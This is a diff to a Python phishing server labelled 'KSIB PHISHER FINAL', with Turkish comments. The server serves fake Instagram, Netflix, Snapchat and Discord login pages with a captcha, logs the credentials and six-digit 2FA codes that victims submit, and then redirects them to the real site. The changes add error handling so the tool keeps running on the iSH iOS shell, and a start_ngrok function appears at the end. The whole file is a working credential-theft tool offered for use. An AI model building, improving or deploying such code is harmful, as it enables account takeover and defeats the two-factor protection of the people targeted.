@@ -1,5 +1,6 @@
 #!/usr/bin/env python3
-import os, sys, http.server, socketserver, time, json, random, uuid, logging, threading, subprocess, platform, requests, tarfile
+# KSIB PHISHER FINAL - iSH Bağlantı Hatası Düzeltildi
+import os, sys, http.server, socketserver, time, json, random, uuid, logging, threading, subprocess, platform, requests
 from http.cookies import SimpleCookie
 from urllib.parse import parse_qs, urlparse
 
@@ -10,7 +11,6 @@ SESSION_TIMEOUT = 1800
 NO_2FA = {"netflix", "snapchat", "discord"}
 
 IS_ISH = os.path.exists("/usr/bin/apk") or "ish" in platform.platform().lower()
-IS_TERMUX = os.path.exists("/data/data/com.termux")
 
 logging.basicConfig(level=logging.INFO, format='%(asctime)s %(message)s')
 
@@ -167,81 +167,104 @@ class Handler(http.server.SimpleHTTPRequestHandler):
     site = "instagram"
 
     def do_GET(self):
-        path = urlparse(self.path).path
-        ip, ua = self.client_address[0], self.headers.get('User-Agent','?')
-        sid = SimpleCookie(self.headers.get('Cookie','')).get('session_id')
-        sid = sid.value if sid else None
-        s = self.sessions.get(sid)
-
-        if not s and path in ("/", "/index.html"):
-            sid = self.sessions.create(ip, ua, self.site)
+        try:
+            path = urlparse(self.path).path
+            ip, ua = self.client_address[0], self.headers.get('User-Agent','?')
+            sid = SimpleCookie(self.headers.get('Cookie','')).get('session_id')
+            sid = sid.value if sid else None
             s = self.sessions.get(sid)
-            self._set_cookie(sid)
 
-        if not s: self.send_error(404); return
-        if self.sessions.blocked(sid): self.send_response(403); self.end_headers(); return
+            if not s and path in ("/", "/index.html"):
+                sid = self.sessions.create(ip, ua, self.site)
+                s = self.sessions.get(sid)
+                self._set_cookie(sid)
 
-        if path in ("/", "/index.html"):
-            err = "Yanlis captcha!" if "error=captcha" in self.path else None
-            q = self.captcha.new(sid)
-            tpl = TEMPLATES.get(s["site"], TEMPLATES["instagram"])
-            html = tpl.replace("{{captcha}}", q).replace("{{error}}", f'<div class="error">{err}</div>' if err else "")
-            self._send_html(html)
-        elif path == "/2fa":
-            if s.get("stage") == "2fa_ok":
-                self._redirect(SITES.get(s["site"], ("", "https://google.com"))[1])
-            elif s.get("stage") == "login_ok":
-                site_name = SITES.get(s["site"], ("Site",))[0]
-                err = "Gecersiz kod!" if "error=invalid" in self.path else None
-                self._send_html(page_2fa(site_name, err))
+            if not s: self.send_error(404); return
+            if self.sessions.blocked(sid): self.send_response(403); self.end_headers(); return
+
+            if path in ("/", "/index.html"):
+                err = "Yanlis captcha!" if "error=captcha" in self.path else None
+                q = self.captcha.new(sid)
+                tpl = TEMPLATES.get(s["site"], TEMPLATES["instagram"])
+                html = tpl.replace("{{captcha}}", q).replace("{{error}}", f'<div class="error">{err}</div>' if err else "")
+                self._send_html(html)
+            elif path == "/2fa":
+                if s.get("stage") == "2fa_ok":
+                    self._redirect(SITES.get(s["site"], ("", "https://google.com"))[1])
+                elif s.get("stage") == "login_ok":
+                    site_name = SITES.get(s["site"], ("Site",))[0]
+                    err = "Gecersiz kod!" if "error=invalid" in self.path else None
+                    self._send_html(page_2fa(site_name, err))
+                else:
+                    self._redirect("/")
             else:
-                self._redirect("/")
-        else:
-            self.send_error(404)
+                self.send_error(404)
+        except (BrokenPipeError, ConnectionResetError, OSError):
+            pass  # iSH bağlantı koptu hatası
 
     def do_POST(self):
-        path = urlparse(self.path).path
-        try: length = int(self.headers.get('Content-Length',0))
-        except: length = 0
-        try: data = self.rfile.read(length).decode()
-        except: data = ""
-        parsed = parse_qs(data) if data else {}
-        sid = SimpleCookie(self.headers.get('Cookie','')).get('session_id')
-        sid = sid.value if sid else None
-        s = self.sessions.get(sid)
+        try:
+            path = urlparse(self.path).path
+            try: length = int(self.headers.get('Content-Length',0))
+            except: length = 0
+            try: data = self.rfile.read(length).decode()
+            except: data = ""
+            parsed = parse_qs(data) if data else {}
+            sid = SimpleCookie(self.headers.get('Cookie','')).get('session_id')
+            sid = sid.value if sid else None
+            s = self.sessions.get(sid)
 
-        if not s or self.sessions.blocked(sid): self._redirect("/blocked"); return
+            if not s or self.sessions.blocked(sid): self._redirect("/blocked"); return
 
-        if path == "/login":
-            if not self.captcha.check(sid, parsed.get("captcha",[""])[0]):
-                self.sessions.fail(sid); self._redirect("/?error=captcha"); return
-            login_data = {k:v[0] for k,v in parsed.items() if k!="captcha"}
-            self.sessions.update(sid, login_data=login_data, stage="login_ok")
-            self.logger.log(s, "login", login_data)
-            if s["site"] in NO_2FA:
-                self.sessions.success(sid)
-                self._redirect(SITES.get(s["site"], ("", "https://google.com"))[1])
+            if path == "/login":
+                if not self.captcha.check(sid, parsed.get("captcha",[""])[0]):
+                    self.sessions.fail(sid); self._redirect("/?error=captcha"); return
+                login_data = {k:v[0] for k,v in parsed.items() if k!="captcha"}
+                self.sessions.update(sid, login_data=login_data, stage="login_ok")
+                self.logger.log(s, "login", login_data)
+                if s["site"] in NO_2FA:
+                    self.sessions.success(sid)
+                    self._redirect(SITES.get(s["site"], ("", "https://google.com"))[1])
+                else:
+                    self._redirect("/2fa")
+            elif path == "/2fa" and s.get("stage") == "login_ok":
+                code = parsed.get("code",[""])[0]
+                if code and len(code)==6 and code.isdigit():
+                    self.sessions.update(sid, stage="2fa_ok", code_data={"code":code})
+                    self.logger.log(s, "2fa", {"code":code})
+                    self.sessions.success(sid)
+                    self._redirect(SITES.get(s["site"], ("", "https://google.com"))[1])
+                else:
+                    self._redirect("/2fa?error=invalid")
             else:
-                self._redirect("/2fa")
-        elif path == "/2fa" and s.get("stage") == "login_ok":
-            code = parsed.get("code",[""])[0]
-            if code and len(code)==6 and code.isdigit():
-                self.sessions.update(sid, stage="2fa_ok", code_data={"code":code})
-                self.logger.log(s, "2fa", {"code":code})
-                self.sessions.success(sid)
-                self._redirect(SITES.get(s["site"], ("", "https://google.com"))[1])
-            else:
-                self._redirect("/2fa?error=invalid")
-        else:
-            self._redirect("/")
+                self._redirect("/")
+        except (BrokenPipeError, ConnectionResetError, OSError):
+            pass  # iSH bağlantı koptu hatası
 
     def _send_html(self, html):
-        self.send_response(200); self.send_header('Content-type','text/html; charset=utf-8')
-        self.end_headers(); self.wfile.write(html.encode())
+        try:
+            self.send_response(200)
+            self.send_header('Content-type','text/html; charset=utf-8')
+            self.end_headers()
+            self.wfile.write(html.encode())
+            self.wfile.flush()
+        except (BrokenPipeError, ConnectionResetError, OSError):
+            pass  # Bağlantı koptu, sessizce geç
+
     def _set_cookie(self, sid):
-        self.send_header('Set-Cookie', f'session_id={sid}; Path=/; HttpOnly; Max-Age={SESSION_TIMEOUT}')
+        try:
+            self.send_header('Set-Cookie', f'session_id={sid}; Path=/; HttpOnly; Max-Age={SESSION_TIMEOUT}')
+        except (BrokenPipeError, ConnectionResetError, OSError):
+            pass
+
     def _redirect(self, loc):
-        self.send_response(302); self.send_header('Location', loc); self.end_headers()
+        try:
+            self.send_response(302)
+            self.send_header('Location', loc)
+            self.end_headers()
+        except (BrokenPipeError, ConnectionResetError, OSError):
+            pass
+
     def log_message(self, *args): pass
 
 def start_ngrok(port):
